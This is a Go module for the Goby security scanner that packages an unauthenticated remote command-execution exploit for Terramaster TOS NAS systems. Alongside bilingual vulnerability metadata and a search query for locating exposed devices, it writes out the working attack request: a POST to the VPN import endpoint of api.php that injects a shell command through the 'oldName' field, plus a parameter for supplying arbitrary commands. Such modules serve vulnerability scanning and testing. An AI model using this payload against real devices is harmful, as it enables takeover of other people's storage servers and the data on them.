package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Terramaster TOS VPN RCE",
    "Description": "<p>Terramaster TOS is a Linux-based operating system from Terramaster, which is dedicated to the erraMaster cloud storage NAS server.</p><p>Terramaster TOS has a command execution vulnerability, which is caused by the fact that the VPN parameters in the api.php script are not strictly verified. An unauthenticated attacker could send special data to exploit the vulnerability and execute arbitrary commands on the target system.</p>",
    "Impact": "Terramaster TOS VPN RCE",
    "Recommendation": "<p>Set up whitelist access through devices such as firewalls</p><p>Pay attention to the official website update in time: <a href=\"https://www.terra-master.com/jp/tos/\">https://www.terra-master.com/jp/tos/</a></p>",
    "Product": "Terramaster TOS",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Terramaster TOS 存储服务系统 VPN 参数命令执行漏洞",
            "Description": "<p>Terramaster TOS是中国铁威马（Terramaster）公司的一款基于Linux平台的，专用于erraMaster云存储NAS服务器的操作系统。<br></p><p><span style=\"color: rgb(0, 0, 0); font-size: 14px;\"></span>Terramaster TOS 存在命令执行漏洞，该漏洞源于api.php脚本中的VPN参数没有严格校验。未经身份验证的攻击者可以发送特殊数据利用该漏洞并在目标系统上执行任意命令。<span style=\"color: rgb(0, 0, 0); font-size: 14px;\"></span><br></p>",
            "Impact": "<p>Terramaster TOS 存在命令执行漏洞，该漏洞源于api.php脚本中的VPN参数没有严格校验。未经身份验证的攻击者可以发送特殊数据利用该漏洞并在目标系统上执行任意命令。<br></p>",
            "Recommendation": "<p>1、通过防火墙等设备设置白名单访问</p><p>2、及时关注官网更新：<a href=\"https://www.terra-master.com/jp/tos/\">https://www.terra-master.com/jp/tos/</a></p>",
            "Product": "Terramaster TOS",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Terramaster TOS VPN RCE",
            "Description": "<p>Terramaster TOS is a Linux-based operating system from Terramaster, which is dedicated to the erraMaster cloud storage NAS server.<br></p><p>Terramaster TOS has a command execution vulnerability, which is caused by the fact that the VPN parameters in the api.php script are not strictly verified. An unauthenticated attacker could send special data to exploit the vulnerability and execute arbitrary commands on the target system.<br></p>",
            "Impact": "Terramaster TOS VPN RCE",
            "Recommendation": "<p>Set up whitelist access through devices such as firewalls</p><p>Pay attention to the official website update in time: <a href=\"https://www.terra-master.com/jp/tos/\">https://www.terra-master.com/jp/tos/</a></p>",
            "Product": "Terramaster TOS",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "title=\"TOS Loading\"",
    "GobyQuery": "title=\"TOS Loading\"",
    "Author": "abszse",
    "Homepage": "https://www.terra-master.com/jp/tos/",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/module/api.php?VPN/_mportVpn",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "status=edit&oldName=1|id||"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/module/api.php?VPN/_mportVpn",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "status=edit&oldName=1|id||"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6876"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
